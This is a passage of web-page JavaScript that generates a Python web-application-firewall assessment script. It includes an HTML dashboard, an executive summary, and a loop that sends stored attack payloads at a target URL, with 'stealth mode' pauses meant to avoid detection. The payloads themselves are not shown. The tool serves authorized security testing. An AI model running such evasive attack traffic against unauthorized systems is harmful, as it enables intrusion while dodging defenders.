                <tr class="test-row {test.result.lower()}" data-category="{test.category}" data-severity="{test.severity}">
                    <td class="text-center">{test.id}</td>
                    <td><span class="badge bg-info">{escapeHtmlContent(test.category)}</span></td>
                    <td class="test-name">{escapeHtmlContent(test.name)}</td>
                    <td><span class="badge bg-{{'critical': 'danger', 'high': 'warning', 'medium': 'info', 'low': 'success'}}[test.severity]">{test.severity.upper()}</span></td>
                    <td><span class="badge bg-{{'BLOCKED': 'success', 'BYPASSED': 'danger', 'FAILED': 'secondary'}}[test.result]">{test.result}</span></td>
                    <td>{test.status_code or "N/A"}</td>
                    <td>{test.duration:.3f}s</td>
                    <td>
                        <div class="waf-info">
                            <strong>{test.waf_type}</strong><br>
                            <div class="progress" style="height: 8px;">
                                <div class="progress-bar bg-{risk_class}" style="width: {test.waf_confidence*100:.0f}%"></div>
                            </div>
                            <small>{test.waf_confidence:.0%}</small>
                        </div>
                    </td>
                    <td><span class="badge bg-{risk_class}">{risk_icon} {test.risk_score}</span></td>
                    <td><span class="badge bg-{threat_class}">{threat_level}</span></td>
                </tr>'''
        test_rows.append(test_row)
    
    # Risk assessment
    if effectiveness >= 95:
        overall_risk_class, overall_risk_text = "success", " Excellent - Superior WAF Protection"
    elif effectiveness >= 85:
        overall_risk_class, overall_risk_text = "success", " Good - Highly Effective WAF"
    elif effectiveness >= 70:
        overall_risk_class, overall_risk_text = "warning", " Moderate - WAF Has Notable Gaps"
    elif effectiveness >= 50:
        overall_risk_class, overall_risk_text = "danger", " Poor - Significant Security Gaps"
    else:
        overall_risk_class, overall_risk_text = "critical", " Critical - Minimal Protection"
    
    # Create enterprise dashboard HTML
    dashboard_html = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enterprise WAF Security Assessment Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        :root {{
            --primary-color: #0d6efd;
            --secondary-color: #6c757d;
            --success-color: #198754;
            --danger-color: #dc3545;
            --warning-color: #ffc107;
            --info-color: #0dcaf0;
            --dark-color: #212529;
        }}
        
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }}
        
        .dashboard-container {{
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            margin: 20px;
            overflow: hidden;
        }}
        
        .dashboard-header {{
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
            padding: 2rem;
            text-align: center;
        }}
        
        .dashboard-header h1 {{
            font-size: 2.5rem;
            font-weight: 700;
            margin-bottom: 0.5rem;
        }}
        
        .dashboard-header .subtitle {{
            font-size: 1.1rem;
            opacity: 0.9;
        }}
        
        .metrics-row {{
            padding: 2rem 1rem;
        }}
        
        .metric-card {{
            background: white;
            border-radius: 10px;
            padding: 1.5rem;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0,0,0,0.07);
            border: 1px solid #e9ecef;
            transition: transform 0.3s ease;
            margin-bottom: 1rem;
        }}
        
        .metric-card:hover {{
            transform: translateY(-5px);
        }}
        
        .metric-card .metric-icon {{
            font-size: 2.5rem;
            margin-bottom: 1rem;
        }}
        
        .metric-card .metric-value {{
            font-size: 2.5rem;
            font-weight: 700;
            margin-bottom: 0.5rem;
        }}
        
        .metric-card .metric-label {{
            color: #6c757d;
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }}
        
        .chart-container {{
            background: white;
            border-radius: 10px;
            padding: 1.5rem;
            margin-bottom: 2rem;
            box-shadow: 0 4px 6px rgba(0,0,0,0.07);
        }}
        
        .test-row.BLOCKED {{
            background-color: rgba(25, 135, 84, 0.1);
        }}
        
        .test-row.BYPASSED {{
            background-color: rgba(220, 53, 69, 0.1);
        }}
        
        .test-row.FAILED {{
            background-color: rgba(108, 117, 125, 0.1);
        }}
        
        .waf-info {{
            min-width: 120px;
        }}
        
        .test-name {{
            max-width: 250px;
            word-wrap: break-word;
        }}
        
        .filter-controls {{
            background: #f8f9fa;
            padding: 1rem;
            border-radius: 8px;
            margin-bottom: 1rem;
        }}
        
        .progress {{
            margin: 0.25rem 0;
        }}
        
        .table-responsive {{
            border-radius: 8px;
            overflow: hidden;
        }}
        
        .navbar-brand {{
            font-weight: 700;
        }}
        
        .alert-security {{
            border-left: 5px solid var(--danger-color);
        }}
        
        .bg-critical {{
            background-color: var(--danger-color) !important;
        }}
        
        .badge.bg-critical {{
            background-color: #721c24 !important;
        }}
    </style>
</head>
<body>
    <div class="dashboard-container">
        <div class="dashboard-header">
            <h1><i class="fas fa-shield-alt"></i> Enterprise WAF Security Dashboard</h1>
            <div class="subtitle">Advanced Web Application Firewall Analysis & Intelligence</div>
            <div class="mt-3">
                <span class="badge bg-light text-dark fs-6">Target: {escapeHtmlContent(TARGET_URL)}</span>
                <span class="badge bg-light text-dark fs-6 ms-2">Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</span>
            </div>
        </div>
        
        <div class="container-fluid">
            <!-- Executive Summary -->
            <div class="row mt-4">
                <div class="col-12">
                    <div class="alert alert-{overall_risk_class} alert-security" role="alert">
                        <h4 class="alert-heading"><i class="fas fa-chart-line"></i> Executive Summary</h4>
                        <p class="mb-0"><strong>Overall Security Posture:</strong> {overall_risk_text}</p>
                        <p class="mb-0">WAF successfully blocked {results.blocked} out of {results.total} attack vectors ({effectiveness:.1f}% effectiveness)</p>
                    </div>
                </div>
            </div>
            
            <!-- Key Metrics -->
            <div class="row metrics-row">
                <div class="col-md-3">
                    <div class="metric-card">
                        <div class="metric-icon text-primary"><i class="fas fa-vial"></i></div>
                        <div class="metric-value text-primary">{results.total}</div>
                        <div class="metric-label">Total Tests</div>
                    </div>
                </div>
                <div class="col-md-3">
                    <div class="metric-card">
                        <div class="metric-icon text-success"><i class="fas fa-shield-alt"></i></div>
                        <div class="metric-value text-success">{results.blocked}</div>
                        <div class="metric-label">Blocked</div>
                    </div>
                </div>
                <div class="col-md-3">
                    <div class="metric-card">
                        <div class="metric-icon text-danger"><i class="fas fa-exclamation-triangle"></i></div>
                        <div class="metric-value text-danger">{results.bypassed}</div>
                        <div class="metric-label">Bypassed</div>
                    </div>
                </div>
                <div class="col-md-3">
                    <div class="metric-card">
                        <div class="metric-icon text-info"><i class="fas fa-percentage"></i></div>
                        <div class="metric-value text-info">{effectiveness:.1f}%</div>
                        <div class="metric-label">Effectiveness</div>
                    </div>
                </div>
            </div>
            
            <!-- Performance Metrics -->
            <div class="row">
                <div class="col-md-4">
                    <div class="metric-card">
                        <div class="metric-icon text-warning"><i class="fas fa-clock"></i></div>
                        <div class="metric-value text-warning">{results.performance.average_response_time:.3f}s</div>
                        <div class="metric-label">Avg Response Time</div>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="metric-card">
                        <div class="metric-icon text-info"><i class="fas fa-tachometer-alt"></i></div>
                        <div class="metric-value text-info">{results.performance.requests_per_second:.1f}</div>
                        <div class="metric-label">Requests/Second</div>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="metric-card">
                        <div class="metric-icon text-secondary"><i class="fas fa-database"></i></div>
                        <div class="metric-value text-secondary">{results.performance.total_data_transferred / 1024:.1f}KB</div>
                        <div class="metric-label">Data Transferred</div>
                    </div>
                </div>
            </div>
            
            <!-- Charts Section -->
            <div class="row mt-4">
                <div class="col-md-6">
                    <div class="chart-container">
                        <h5><i class="fas fa-chart-pie"></i> Test Results Distribution</h5>
                        <canvas id="resultsChart" height="200"></canvas>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="chart-container">
                        <h5><i class="fas fa-chart-bar"></i> Risk Distribution</h5>
                        <canvas id="riskChart" height="200"></canvas>
                    </div>
                </div>
            </div>
            
            <div class="row">
                <div class="col-md-6">
                    <div class="chart-container">
                        <h5><i class="fas fa-chart-line"></i> Category Effectiveness</h5>
                        <canvas id="categoryChart" height="200"></canvas>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="chart-container">
                        <h5><i class="fas fa-shield-alt"></i> WAF Technologies Detected</h5>
                        <canvas id="wafChart" height="200"></canvas>
                    </div>
                </div>
            </div>
            
            <!-- Detected WAF Technologies -->
            {f'''<div class="row mt-4">
                <div class="col-12">
                    <div class="alert alert-info">
                        <h5><i class="fas fa-fingerprint"></i> Detected WAF Technologies</h5>
                        <div>
                            {"".join([f'<span class="badge bg-primary me-2"><i class="fas fa-shield-alt"></i> {waf}</span>' for waf in results.waf_fingerprints])}
                        </div>
                    </div>
                </div>
            </div>''' if results.waf_fingerprints else ''}
            
            <!-- Detailed Test Results -->
            <div class="row mt-4">
                <div class="col-12">
                    <div class="chart-container">
                        <h5><i class="fas fa-table"></i> Detailed Test Results</h5>
                        
                        <!-- Filter Controls -->
                        <div class="filter-controls">
                            <div class="row">
                                <div class="col-md-3">
                                    <label for="resultFilter" class="form-label">Filter by Result:</label>
                                    <select class="form-select" id="resultFilter" onchange="filterTests()">
                                        <option value="all">All Results</option>
                                        <option value="BLOCKED">Blocked</option>
                                        <option value="BYPASSED">Bypassed</option>
                                        <option value="FAILED">Failed</option>
                                    </select>
                                </div>
                                <div class="col-md-3">
                                    <label for="severityFilter" class="form-label">Filter by Severity:</label>
                                    <select class="form-select" id="severityFilter" onchange="filterTests()">
                                        <option value="all">All Severities</option>
                                        <option value="critical">Critical</option>
                                        <option value="high">High</option>
                                        <option value="medium">Medium</option>
                                        <option value="low">Low</option>
                                    </select>
                                </div>
                                <div class="col-md-3">
                                    <label for="categoryFilter" class="form-label">Filter by Category:</label>
                                    <select class="form-select" id="categoryFilter" onchange="filterTests()">
                                        <option value="all">All Categories</option>
                                        {chr(10).join([f'<option value="{category}">{category}</option>' for category in results.categories_tested])}
                                    </select>
                                </div>
                                <div class="col-md-3">
                                    <label class="form-label">&nbsp;</label>
                                    <button class="btn btn-outline-secondary d-block" onclick="resetFilters()">
                                        <i class="fas fa-undo"></i> Reset Filters
                                    </button>
                                </div>
                            </div>
                        </div>
                        
                        <div class="table-responsive">
                            <table class="table table-hover" id="testsTable">
                                <thead class="table-dark">
                                    <tr>
                                        <th>ID</th>
                                        <th>Category</th>
                                        <th>Test Name</th>
                                        <th>Severity</th>
                                        <th>Result</th>
                                        <th>Status</th>
                                        <th>Duration</th>
                                        <th>WAF Detection</th>
                                        <th>Risk</th>
                                        <th>AI Threat</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    {"".join(test_rows)}
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Chart.js configurations
        Chart.defaults.font.family = "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif";
        Chart.defaults.font.size = 12;
        
        // Results Distribution Chart
        const resultsCtx = document.getElementById('resultsChart').getContext('2d');
        new Chart(resultsCtx, {{
            type: 'doughnut',
            data: {{
                labels: ['Blocked', 'Bypassed', 'Failed'],
                datasets: [{{
                    data: [{results.blocked}, {results.bypassed}, {results.failed}],
                    backgroundColor: ['#198754', '#dc3545', '#6c757d'],
                    borderWidth: 2,
                    borderColor: '#fff'
                }}]
            }},
            options: {{
                responsive: true,
                maintainAspectRatio: false,
                plugins: {{
                    legend: {{
                        position: 'bottom'
                    }}
                }}
            }}
        }});
        
        // Risk Distribution Chart
        const riskCtx = document.getElementById('riskChart').getContext('2d');
        new Chart(riskCtx, {{
            type: 'bar',
            data: {{
                labels: ['Low', 'Medium', 'High', 'Critical'],
                datasets: [{{
                    label: 'Number of Tests',
                    data: [{risk_distribution["Low"]}, {risk_distribution["Medium"]}, {risk_distribution["High"]}, {risk_distribution["Critical"]}],
                    backgroundColor: ['#198754', '#ffc107', '#fd7e14', '#dc3545'],
                    borderWidth: 1
                }}]
            }},
            options: {{
                responsive: true,
                maintainAspectRatio: false,
                scales: {{
                    y: {{
                        beginAtZero: true,
                        ticks: {{
                            stepSize: 1
                        }}
                    }}
                }}
            }}
        }});
        
        // Category Effectiveness Chart
        const categoryCtx = document.getElementById('categoryChart').getContext('2d');
        const categoryLabels = {list(category_stats.keys())};
        const categoryEffectiveness = {[category_stats[cat]["blocked"] / category_stats[cat]["total"] * 100 if category_stats[cat]["total"] > 0 else 0 for cat in category_stats.keys()]};
        
        new Chart(categoryCtx, {{
            type: 'horizontalBar',
            data: {{
                labels: categoryLabels,
                datasets: [{{
                    label: 'Effectiveness (%)',
                    data: categoryEffectiveness,
                    backgroundColor: '#0d6efd',
                    borderColor: '#0d6efd',
                    borderWidth: 1
                }}]
            }},
            options: {{
                responsive: true,
                maintainAspectRatio: false,
                scales: {{
                    x: {{
                        beginAtZero: true,
                        max: 100
                    }}
                }}
            }}
        }});
        
        // WAF Technologies Chart
        const wafCtx = document.getElementById('wafChart').getContext('2d');
        const wafLabels = {list(waf_detection_stats.keys()) if waf_detection_stats else ['No WAF Detected']};
        const wafCounts = {list(waf_detection_stats.values()) if waf_detection_stats else [0]};
        
        new Chart(wafCtx, {{
            type: 'pie',
            data: {{
                labels: wafLabels,
                datasets: [{{
                    data: wafCounts,
                    backgroundColor: [
                        '#0d6efd', '#198754', '#ffc107', '#dc3545', '#20c997', 
                        '#6610f2', '#fd7e14', '#6f42c1', '#d63384', '#20c997'
                    ],
                    borderWidth: 2,
                    borderColor: '#fff'
                }}]
            }},
            options: {{
                responsive: true,
                maintainAspectRatio: false,
                plugins: {{
                    legend: {{
                        position: 'bottom'
                    }}
                }}
            }}
        }});
        
        // Filter Functions
        function filterTests() {{
            const resultFilter = document.getElementById('resultFilter').value;
            const severityFilter = document.getElementById('severityFilter').value;
            const categoryFilter = document.getElementById('categoryFilter').value;
            const rows = document.querySelectorAll('#testsTable tbody tr');
            
            rows.forEach(row => {{
                let show = true;
                
                // Result filter
                if (resultFilter !== 'all' && !row.classList.contains(resultFilter)) {{
                    show = false;
                }}
                
                // Severity filter
                if (severityFilter !== 'all' && !row.dataset.severity.includes(severityFilter)) {{
                    show = false;
                }}
                
                // Category filter
                if (categoryFilter !== 'all' && !row.dataset.category.includes(categoryFilter)) {{
                    show = false;
                }}
                
                row.style.display = show ? '' : 'none';
            }});
        }}
        
        function resetFilters() {{
            document.getElementById('resultFilter').value = 'all';
            document.getElementById('severityFilter').value = 'all';
            document.getElementById('categoryFilter').value = 'all';
            filterTests();
        }}
        
        // Auto-refresh functionality (disabled for static report)
        // setInterval(() => {{ location.reload(); }}, 30000); // 30 seconds
    </script>
</body>
</html>'''
    
    with open(dashboard_path, "w", encoding="utf-8") as f:
        f.write(dashboard_html)
    
    logger.info(f"Enterprise dashboard generated: {dashboard_path}")

def print_enterprise_executive_summary():
    """Print comprehensive executive summary with business intelligence"""
    effectiveness = results.get_effectiveness()
    results.calculate_performance_metrics()
    results.generate_compliance_scores()
    
    print("\\n" + "=" * 120)
    print(" ENTERPRISE WAF SECURITY ASSESSMENT - EXECUTIVE INTELLIGENCE REPORT")
    print("=" * 120)
    print(f" TARGET INFRASTRUCTURE: {TARGET_URL}")
    print(f" ASSESSMENT TIMESTAMP: {datetime.now().strftime('%B %d, %Y at %H:%M:%S UTC')}")
    print(f" ENTERPRISE PLATFORM: WAF Security Assessment Platform v5.0")
    print(f"  TOTAL EXECUTION TIME: {sum(test.duration for test in results.tests):.1f} seconds")
    print(f" AI ANALYSIS: {'ENABLED' if EnterpriseConfig.ENABLE_AI_ANALYSIS else 'DISABLED'}")
    print("-" * 120)
    
    # Core Security Metrics
    print(" CORE SECURITY METRICS:")
    print(f"    Total Attack Vectors Tested: {results.total} across {len(results.categories_tested)} categories")
    print(f"    Successfully Blocked: {results.blocked} ({results.blocked/results.total*100:.1f}%)")
    print(f"    Security Bypasses: {results.bypassed} ({results.bypassed/results.total*100:.1f}%)")
    print(f"     Test Failures: {results.failed} ({results.failed/results.total*100:.1f}%)")
    print(f"    Overall WAF Effectiveness: {effectiveness:.1f}%")
    print()
    
    # Advanced Intelligence
    if results.waf_fingerprints:
        print("  WAF TECHNOLOGY INTELLIGENCE:")
        for waf in results.waf_fingerprints:
            waf_tests = [test for test in results.tests if test.waf_type == waf]
            waf_confidence = statistics.mean([test.waf_confidence for test in waf_tests if test.waf_confidence > 0]) if waf_tests else 0
            print(f"     {waf}: {len(waf_tests)} detections (Avg Confidence: {waf_confidence:.0%})")
        print()
    
    # Performance Intelligence
    print(" PERFORMANCE INTELLIGENCE:")
    print(f"    Average Response Time: {results.performance.average_response_time:.3f}s")
    print(f"    Throughput: {results.performance.requests_per_second:.2f} requests/second")
    print(f"    Success Rate: {results.performance.success_rate:.1f}%")
    print(f"    Total Data Processed: {results.performance.total_data_transferred / 1024:.1f} KB")
    
    if results.performance.response_times:
        median_time = statistics.median(results.performance.response_times)
        std_dev = statistics.stdev(results.performance.response_times) if len(results.performance.response_times) > 1 else 0
        print(f"    Response Time Analysis: Median={median_time:.3f}s, StdDev={std_dev:.3f}s")
    print()
    
    # AI Threat Intelligence
    ai_high_threat = len([test for test in results.tests if test.ai_analysis.get('threat_sophistication') in ['High', 'Very High']])
    evasion_detected = len([test for test in results.tests if test.ai_analysis.get('evasion_technique_detected', False)])
    automated_attacks = len([test for test in results.tests if test.ai_analysis.get('automated_attack_pattern', False)])
    
    if EnterpriseConfig.ENABLE_AI_ANALYSIS:
        print(" AI THREAT INTELLIGENCE:")
        print(f"    High Sophistication Threats: {ai_high_threat}")
        print(f"    Evasion Techniques Detected: {evasion_detected}")
        print(f"    Automated Attack Patterns: {automated_attacks}")
        
        # Threat landscape analysis
        attack_vectors = Counter([test.ai_analysis.get('attack_vector_classification', 'Unknown') for test in results.tests])
        print(f"    Primary Attack Vectors: {', '.join([f'{vector}({count})' for vector, count in attack_vectors.most_common(3)])}")
        print()
    
    # Risk Assessment Matrix
    high_risk_bypasses = [test for test in results.tests if test.result == "BYPASSED" and test.risk_score > 75]
    critical_bypasses = [test for test in results.tests if test.severity == "critical" and test.result == "BYPASSED"]
    
    print(" CRITICAL RISK ASSESSMENT:")
    if critical_bypasses:
        print(f"    CRITICAL ALERT: {len(critical_bypasses)} critical vulnerabilities bypassed WAF protection")
        for test in critical_bypasses[:5]:  # Show top 5
            print(f"       {test.name} ({test.category}) - Risk Score: {test.risk_score}")
            if test.ai_analysis.get('threat_sophistication') == 'Very High':
                print(f"          AI Analysis: Very High Threat Sophistication")
    
    if high_risk_bypasses:
        print(f"    HIGH RISK FINDINGS: {len(high_risk_bypasses)} high-risk attacks bypassed WAF")
    
    if not critical_bypasses and not high_risk_bypasses:
        print("    No critical or high-risk bypass vulnerabilities detected")
    print()
    
    # Compliance Intelligence
    if EnterpriseConfig.ENABLE_COMPLIANCE_REPORTING and results.compliance_scores:
        print(" COMPLIANCE INTELLIGENCE:")
        for standard, scores in results.compliance_scores.items():
            status = " COMPLIANT" if scores.get('compliant', scores.get('requirements_met', False)) else " NON-COMPLIANT"
            score = scores.get('score', 0)
            print(f"   {standard.upper()}: {status} (Score: {score:.1f}%)")
        print()
    
    # Behavioral Analysis Insights
    if EnterpriseConfig.ENABLE_BEHAVIORAL_LEARNING:
        print(" BEHAVIORAL ANALYSIS INSIGHTS:")
        
        # Detection method analysis
        detection_methods = Counter([test.detection_method for test in results.tests if test.detection_method])
        print("    Detection Method Distribution:")
        for method, count in detection_methods.most_common(3):
            percentage = (count / results.total) * 100
            print(f"       {method}: {count} tests ({percentage:.1f}%)")
        
        # Payload effectiveness analysis
        if results.performance.payload_effectiveness:
            print("    Payload Technique Effectiveness:")
            for encoding, stats in list(results.performance.payload_effectiveness.items())[:5]:
                if stats['total'] > 0:
                    success_rate = (stats['bypassed'] / stats['total']) * 100
                    print(f"       {encoding}: {success_rate:.1f}% bypass rate ({stats['bypassed']}/{stats['total']})")
        print()
    
    # Business Impact Assessment
    print(" BUSINESS IMPACT ASSESSMENT:")
    if effectiveness >= 95:
        impact_level = "MINIMAL"
        business_risk = "Very Low"
        recommendation = "Continue current security posture with regular monitoring"
    elif effectiveness >= 85:
        impact_level = "LOW"
        business_risk = "Low"
        recommendation = "Minor security improvements recommended"
    elif effectiveness >= 70:
        impact_level = "MODERATE"
        business_risk = "Medium"
        recommendation = "Security enhancement required within 30 days"
    elif effectiveness >= 50:
        impact_level = "HIGH"
        business_risk = "High"
        recommendation = "Immediate security remediation required"
    else:
        impact_level = "CRITICAL"
        business_risk = "Very High"
        recommendation = "Emergency security response required immediately"
    
    print(f"    Business Risk Level: {business_risk}")
    print(f"    Estimated Impact: {impact_level}")
    print(f"    Executive Recommendation: {recommendation}")
    print()
    
    # Strategic Recommendations
    print(" STRATEGIC RECOMMENDATIONS:")
    print("   1. Immediate Actions:")
    if critical_bypasses:
        print("       Address critical vulnerability bypasses within 24 hours")
        print("       Implement emergency WAF rule updates for detected bypasses")
    if effectiveness < 80:
        print("       Review and strengthen WAF configuration")
        print("       Implement additional security layers (DDoS protection, rate limiting)")
    
    print("   2. Short-term Improvements (30 days):")
    print("       Deploy advanced threat intelligence integration")
    print("       Implement behavioral analysis and anomaly detection")
    print("       Enhance monitoring and alerting capabilities")
    
    print("   3. Long-term Strategy (90 days):")
    print("       Implement AI-powered security automation")
    print("       Deploy comprehensive security orchestration platform")
    print("       Establish continuous security assessment program")
    print()
    
    # Resource Information
    print(" COMPREHENSIVE REPORTING PACKAGE:")
    print(f"    Interactive Dashboard: {os.path.join(OUTPUT_DIR, 'dashboards', 'enterprise_dashboard.html')}")
    print(f"    Executive Report: {os.path.join(OUTPUT_DIR, 'reports', 'executive_summary.pdf')}")
    print(f"    Technical Analysis: {os.path.join(OUTPUT_DIR, 'exports', 'enterprise_comprehensive.json')}")
    print(f"    Compliance Report: {os.path.join(OUTPUT_DIR, 'compliance', 'compliance_assessment.html')}")
    if 'csv' in EnterpriseConfig.EXPORT_FORMATS:
        print(f"    Data Export: {os.path.join(OUTPUT_DIR, 'exports', 'enterprise_assessment.csv')}")
    print("=" * 120)

def execute_enterprise_assessment():
    """Execute the complete enterprise-grade security assessment"""
    logger.info(" Initiating Enterprise WAF Security Assessment Platform v5.0")
    logger.info(f" Target Infrastructure: {TARGET_URL}")
    logger.info(f" Assessment Scope: {len(tests)} attack vectors across multiple categories")
    logger.info(f" Enterprise Configuration: AI={EnterpriseConfig.ENABLE_AI_ANALYSIS}, ML={EnterpriseConfig.ENABLE_BEHAVIORAL_LEARNING}, Stealth={EnterpriseConfig.ENABLE_STEALTH_MODE}")
    logger.info(f" Output Directory: {OUTPUT_DIR}")
    
    try:
        assessment_start = time.time()
        
        # Pre-assessment initialization
        logger.info(" Initializing enterprise assessment components...")
        
        # Initialize AI components
        if EnterpriseConfig.ENABLE_AI_ANALYSIS:
            logger.info(" AI analysis engine initialized")
        
        # Initialize caching system
        if EnterpriseConfig.ENABLE_CACHING:
            logger.info(" Response caching system enabled")
        
        # Execute tests with enterprise features
        logger.info(" Beginning comprehensive security assessment...")
        
        for i, test_data in enumerate(tests, 1):
            # Progress reporting with enhanced metrics
            if i % 3 == 0 or i == len(tests):
                progress = (i / len(tests)) * 100
                eta = ((time.time() - assessment_start) / i) * (len(tests) - i)
                logger.info(f" Assessment Progress: {i}/{len(tests)} ({progress:.1f}%) | ETA: {eta:.0f}s")
            
            # Execute individual test with enterprise features
            result = run_enterprise_test(test_data)
            results.add_result(result)
            
            # Real-time threat detection alerting
            if result.result == "BYPASSED" and result.risk_score > 85:
                logger.warning(f" HIGH-RISK BYPASS DETECTED: {result.name} (Risk: {result.risk_score})", 
                             test_id=result.id, category="SECURITY_ALERT")
            
            # Intelligent traffic management
            if i < len(tests):
                if i % EnterpriseConfig.MAX_CONSECUTIVE_REQUESTS == 0:
                    pause_time = EnterpriseConfig.LONG_PAUSE + random.uniform(0, 3)
                    logger.info(f" Anti-detection pause: {pause_time:.1f}s (Enterprise stealth mode)")
                    time.sleep(pause_time)
                else:
                    delay = intelligent_traffic_shaping()
                    logger.debug(f"Traffic shaping: {delay:.2f}s", test_id=result.id)
        
        total_assessment_time = time.time() - assessment_start
        logger.info(f" Enterprise assessment completed in {total_assessment_time:.1f} seconds")
        
        # Post-assessment analysis and reporting
        logger.info(" Generating enterprise intelligence reports...")
        
        # Calculate final metrics
        results.calculate_performance_metrics()
        results.generate_compliance_scores()
        
        # Generate comprehensive reporting suite
        logger.info(" Generating executive dashboard...")
        generate_enterprise_dashboard()
        
        logger.info(" Exporting enterprise data packages...")
        export_enterprise_reports()
        
        logger.info(" Generating compliance assessments...")
        # Additional compliance reporting would go here
        
        # Generate executive summary
        print_enterprise_executive_summary()
        
        # Final success notification
        logger.info(" Enterprise WAF Security Assessment completed successfully!")
        logger.info(f" All reports and analysis available in: {OUTPUT_DIR}")
        
        return 0
        
    except KeyboardInterrupt:
        logger.warning(" Enterprise assessment interrupted by user")
        if results.tests:
            logger.info(" Saving partial results...")
            export_enterprise_reports()
            print_enterprise_executive_summary()
        return 1
        
    except Exception as e:
        logger.error(f" Critical enterprise assessment error: {str(e)}", category="SYSTEM_ERROR")
        if results.tests:
            logger.info(" Attempting to save collected data...")
            try:
                export_enterprise_reports()
                print_enterprise_executive_summary()
            except:
                logger.error("Failed to save partial results")
        return 1

# Test data with enterprise metadata
tests = [`;

        // Add each test with enhanced enterprise metadata
        for (let i = 0; i < tests.length; i++) {
            const { category, test } = tests[i];
            
            script += `    {
        "id": ${i + 1},
        "category": "${escapePythonString(category)}",
        "name": "${escapePythonString(test.name)}",
        "description": "${escapePythonString(test.description)}",
        "payload": "${escapePythonString(test.payload)}",
        "severity": "${test.severity}",
        "enterprise_metadata": {
            "compliance_relevance": ["owasp_asvs", "pci_dss"],
            "business_impact": "${test.severity === 'critical' ? 'high' : test.severity === 'high' ? 'medium' : 'low'}",
            "threat_category": "${category.toLowerCase().includes('xss') ? 'injection' : category.toLowerCase().includes('sql') ? 'injection' : 'other'}"
        }
    }`;
            
            if (i < tests.length - 1) {
                script += ',\n';
            } else {
                script += '\n';
            }
        }
        
        // Complete the enterprise script
        script += `]

# Enterprise Main Execution
if __name__ == "__main__":
    import sys
    import signal
    
    def signal_handler(sig, frame):
        """Handle graceful shutdown on interrupt"""
        logger.warning("Received interrupt signal - initiating graceful shutdown...")
        if results.tests:
            logger.info("Saving assessment data before exit...")
            try:
                export_enterprise_reports()
                print_enterprise_executive_summary()
            except Exception as e:
                logger.error(f"Error during graceful shutdown: {e}")
        sys.exit(1)
    
    # Register signal handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Enterprise banner with system information
    print("" + "=" * 118)
    print("   ENTERPRISE WAF SECURITY ASSESSMENT PLATFORM v5.0")
    print("   Advanced AI-Powered Web Application Firewall Testing Suite")
    print("    Machine Learning   Stealth Mode   Business Intelligence")
    print("=" * 120)
    print()
    
    # System capability check
    print(" ENTERPRISE SYSTEM INITIALIZATION:")
    print(f"    Python Version: {sys.version.split()[0]}")
    print(f"    AI Analytics: {' ENABLED' if ADVANCED_ANALYTICS else ' DISABLED (install numpy, scipy, matplotlib)'}")
    print(f"    Interactive Charts: {' ENABLED' if INTERACTIVE_CHARTS else ' DISABLED (install plotly)'}")
    print(f"    Advanced Templates: {' ENABLED' if TEMPLATE_ENGINE else ' DISABLED (install jinja2)'}")
    print(f"    Parallel Processing:  ENABLED ({EnterpriseConfig.PARALLEL_THREADS} threads)")
    print(f"    Stealth Mode: {' ENABLED' if EnterpriseConfig.ENABLE_STEALTH_MODE else ' DISABLED'}")
    print()
    
    # Legal and compliance notice
    print("  LEGAL COMPLIANCE NOTICE:")
    print("   This enterprise assessment tool is designed for authorized security testing only.")
    print("   Ensure proper authorization before testing any systems not owned by your organization.")
    print("   Results should be handled according to your organization's data classification policies.")
    print()
    
    # Execute enterprise assessment with error handling
    try:
        exit_code = execute_enterprise_assessment()
        
        if exit_code == 0:
            print("\\n ENTERPRISE ASSESSMENT COMPLETED SUCCESSFULLY")
            print(" Review the generated reports and take appropriate security actions based on findings.")
        else:
            print("\\n ENTERPRISE ASSESSMENT COMPLETED WITH WARNINGS")
            print(" Partial results may be available - review logs for details.")
            
    except Exception as e:
        logger.error(f"Fatal enterprise system error: {e}")
        print(f"\\n CRITICAL SYSTEM ERROR: {e}")
        print(" Contact your system administrator or check the error logs for details.")
        exit_code = 2
    
    print("\\n" + "=" * 120)
    sys.exit(exit_code)
`;
        
        return script;
    }

    // Initialize when DOM is ready
    if (document.readyState !== 'loading') {
        addPythonTestButton();
    } else {
        document.addEventListener('DOMContentLoaded', addPythonTestButton);
    }
})();
</script>



</body>
</html>